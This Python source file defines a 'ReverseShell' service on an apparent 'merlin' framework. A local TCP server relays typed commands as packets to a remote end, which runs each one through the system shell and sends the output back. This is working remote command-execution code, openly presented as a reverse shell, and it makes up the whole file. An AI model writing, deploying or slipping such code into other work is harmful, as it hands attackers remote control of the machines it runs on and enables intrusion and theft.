import asyncio
from asyncio.subprocess import PIPE, STDOUT

from merlin.core import Service, OpCode
from merlin.ext.ui import TcpServer


class ReverseShell(Service, TcpServer):
    """A reverse tcp shell service.

    This service starts a tcp server on localhost:1234
    the host and port can be configured by setting the
    _TCP_SERVER_HOST and _TCP_SERVER_PORT attributes
    respectively.

    `on_data` is an event listener that is fired when a
    packet is available for processing, packets are matched
    based on the op code of the body, and this callback
    only listens for Data packets.

    `on_ack` is like `on_data` but listens for Ack packets instead.

    `tcp_server_callback` is just as the name implies
    it's decorated with `TcpServer.client_connected` in
    order to be used as the client callback function for
    incoming tcp connections. This callback is run when
    a connection is established and provides a reader and
    writer.

    """

     # Listeners

    @Service.listener(OpCode.Data)
    async def on_data(self, packet):
        process = await asyncio.create_subprocess_shell(packet.data, stdout=PIPE, stderr=STDOUT)

        try:
            stdout, _ = await process.communicate()
        except Exception as err:
            stdout = str(err).encode('utf-8')

        await packet.ack(stdout.decode('utf-8'))

    @Service.listener(OpCode.Ack)
    async def on_ack(self, packet):
        print('Recieved ack: ', repr(packet))

    # TCP Server

    @TcpServer.client_connected
    async def tcp_server_callback(self, reader, writer):
        async def callback(packet):
            writer.write('{0}:{1}'.format(str(packet.author), str(packet.data)).encode('utf-8'))
            await writer.drain()

        while True:
            data = (await reader.readline()).decode().strip()

            if data == 'exit':
                writer.close()
                await writer.wait_closed()
                break
            else:
                await self._client.send_packet(op=OpCode.Data, data=data, ack_cb=callback)
